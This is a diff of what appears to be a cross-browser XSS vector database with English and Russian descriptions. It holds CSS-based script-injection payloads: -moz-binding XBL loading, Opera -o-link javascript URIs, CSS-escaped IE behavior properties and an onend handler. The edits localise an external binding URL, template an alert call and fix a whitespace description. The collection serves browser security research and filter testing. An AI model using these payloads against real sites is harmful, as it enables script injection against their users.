@@ -1386,7 +1386,7 @@ var items =
             'ru' : 'Разрыв css-строки в Opera и Firefox',
             'de' : ''
         },
-        'data'       : '<div style="background:url(\'/foo/&#x0A);-moz-binding:url(http://heideri.ch/jso/moztest.xml#xss);-o-link-source:current;-o-link:&quot;%js_uri_alert%\\00\');">XXX',
+        'data'       : '<div style="background:url(\'/foo/&#x0A);-moz-binding:url(moztest.xml#xss);-o-link-source:current;-o-link:&quot;%js_uri_alert%\\00\');">XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
@@ -1880,9 +1880,9 @@ var items =
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
-            'en' : 'All browsers allow to use whitespace (\\x20,\\x09,\\x0A,\\x09) and css-comment before and after the properties. In addition, left curly brace ({) can precede the property in Opera and FF. IE allows to use many other non-alphanumeric characters and css-strings before and after (quirks mode only) properties. This is shown in the example. Also IE ignores NULL-character.',
+            'en' : 'All browsers allow to use whitespace (\\x20,\\x09,\\x0A,\\x0D) and css-comment before and after the properties. In addition, left curly brace ({) can precede the property in Opera and FF. IE allows to use many other non-alphanumeric characters and css-strings before and after (quirks mode only) properties. This is shown in the example. Also IE ignores NULL-character.',
             'ja' : '',
-            'ru' : 'Все браузеры позволяют использовать пробельные символы (\\x20,\\x09,\\x0A,\\x09) и css-комментарии до и после свойств. Кроме того, в FF и Opera свойству может предшествовать левая фигурная скобка ({). IE допускает использовать множество других не буквенно-цифровых символов и строки до и после (только в режиме совместимости) свойств. Это показано в примере. Также IE игнорирует нулевой символ.',
+            'ru' : 'Все браузеры позволяют использовать пробельные символы (\\x20,\\x09,\\x0A,\\x0D) и css-комментарии до и после свойств. Кроме того, в FF и Opera свойству может предшествовать левая фигурная скобка ({). IE допускает использовать множество других не буквенно-цифровых символов и строки до и после (только в режиме совместимости) свойств. Это показано в примере. Также IE игнорирует нулевой символ.',
             'de' : ''
         },
         'urls'    : [],
@@ -1909,7 +1909,7 @@ var items =
             'ru' : 'CSS-кодирование и добавление обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\&#x0A\\&#x0A\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B-source:current" end=0 onend=alert(1)>XXX',
+        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\&#x0A\\&#x0A\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
